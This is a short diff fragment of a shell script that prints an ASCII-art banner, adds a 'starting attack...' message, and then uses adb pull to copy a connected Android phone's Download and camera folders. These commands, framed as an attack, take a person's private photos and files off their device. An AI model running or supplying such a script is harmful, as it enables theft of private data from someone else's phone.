@@ -22,6 +22,7 @@ echo "               l        l\ \ "
 echo "               l        l/ / "
 echo "               l  l l   l / "
 echo "               \ ml lm /_/ "        
+echo -e "$grn starting attack...$rset"
 sleep 5
 adb pull /sdcard/Download
 adb pull /sdcard/DCMI
